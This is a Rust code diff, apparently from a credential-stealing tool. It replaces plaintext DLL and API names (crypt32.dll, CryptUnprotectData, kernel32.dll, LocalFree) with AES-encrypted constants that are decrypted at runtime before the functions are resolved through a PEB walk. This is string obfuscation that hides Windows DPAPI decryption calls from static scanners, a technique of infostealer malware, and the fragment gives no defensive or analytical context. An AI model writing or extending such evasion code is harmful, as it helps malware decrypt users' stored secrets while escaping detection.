@@ -5,6 +5,13 @@ use aes_gcm::{
     Aes256Gcm, Key, Nonce,
 };
 
+use crate::xor::{aes_str,
+    DLL_CRYPT32_KEY, DLL_CRYPT32_NONCE, DLL_CRYPT32_CT,
+    DLL_KERNEL32_KEY, DLL_KERNEL32_NONCE, DLL_KERNEL32_CT,
+    API_CRYPT_UNPROTECT_KEY, API_CRYPT_UNPROTECT_NONCE, API_CRYPT_UNPROTECT_CT,
+    API_LOCAL_FREE_KEY, API_LOCAL_FREE_NONCE, API_LOCAL_FREE_CT,
+};
+
 const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;
 const CRYPTPROTECT_LOCAL_MACHINE: u32 = 0x4;
 
@@ -49,14 +56,18 @@ type CryptUnprotectDataFn = unsafe extern "system" fn(
 type LocalFreeFn = unsafe extern "system" fn(*mut u8) -> *mut u8;
 
 fn get_crypt_unprotect_data() -> Option<CryptUnprotectDataFn> {
-    let crypt32 = peb::get_module_base("crypt32.dll")?;
-    let addr = peb::resolve_export(crypt32, "CryptUnprotectData")?;
+    let dll_s = aes_str(DLL_CRYPT32_CT, &DLL_CRYPT32_KEY, &DLL_CRYPT32_NONCE);
+    let api_s = aes_str(API_CRYPT_UNPROTECT_CT, &API_CRYPT_UNPROTECT_KEY, &API_CRYPT_UNPROTECT_NONCE);
+    let crypt32 = peb::get_module_base(&dll_s)?;
+    let addr = peb::resolve_export(crypt32, &api_s)?;
     Some(unsafe { mem::transmute(addr) })
 }
 
 fn get_local_free() -> Option<LocalFreeFn> {
-    let kernel32 = peb::get_module_base("kernel32.dll")?;
-    let addr = peb::resolve_export(kernel32, "LocalFree")?;
+    let dll_s = aes_str(DLL_KERNEL32_CT, &DLL_KERNEL32_KEY, &DLL_KERNEL32_NONCE);
+    let api_s = aes_str(API_LOCAL_FREE_CT, &API_LOCAL_FREE_KEY, &API_LOCAL_FREE_NONCE);
+    let kernel32 = peb::get_module_base(&dll_s)?;
+    let addr = peb::resolve_export(kernel32, &api_s)?;
     Some(unsafe { mem::transmute(addr) })
 }
 
